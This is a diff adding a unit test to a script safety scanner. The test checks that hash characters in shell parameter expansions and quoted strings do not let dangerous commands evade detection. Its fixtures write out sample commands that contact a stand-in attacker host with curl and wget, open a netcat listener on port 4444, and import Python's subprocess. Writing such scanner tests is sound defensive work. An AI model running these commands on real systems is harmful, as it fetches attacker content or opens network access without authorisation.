@@ -242,6 +242,45 @@ describe("Script Behavioral Scanner", () => {
       expect(resultCjs.errors.some(e => e.message.includes("child_process"))).toBe(true);
     });
 
+    it("should not bypass scanner when hash symbols are used in strings or parameter expansions", () => {
+      // Shell scripts with parameter expansion `$#` and quoted `#`
+      const shCode1 = `
+        #!/bin/bash
+        if [ $# -gt 0 ]; then
+          curl http://attacker.com
+        fi
+      `;
+      const resultSh1 = scanScriptSafety("script.sh", shCode1);
+      expect(resultSh1.valid).toBe(false);
+      expect(resultSh1.errors.some(e => e.message.includes("curl"))).toBe(true);
+
+      const shCode2 = `
+        #!/bin/bash
+        url="http://attacker.com/#curl"
+        wget "$url"
+      `;
+      const resultSh2 = scanScriptSafety("script.sh", shCode2);
+      expect(resultSh2.valid).toBe(false);
+      expect(resultSh2.errors.some(e => e.message.includes("wget"))).toBe(true);
+
+      const shCode3 = `
+        #!/bin/bash
+        length=\${#myvar}
+        nc -l 4444
+      `;
+      const resultSh3 = scanScriptSafety("script.sh", shCode3);
+      expect(resultSh3.valid).toBe(false);
+      expect(resultSh3.errors.some(e => e.message.includes("nc"))).toBe(true);
+
+      // Python script with literal `#` inside quoted strings
+      const pyCode = `
+        url = "https://example.com/#ref"
+        import subprocess
+      `;
+      const resultPy = scanScriptSafety("script.py", pyCode);
+      expect(resultPy.valid).toBe(false);
+      expect(resultPy.errors.some(e => e.message.includes("subprocess"))).toBe(true);
+    });
     it("should strip comments in shell scripts and ignore ssh or sudo keywords inside them", () => {
       const code = `
         #!/bin/bash
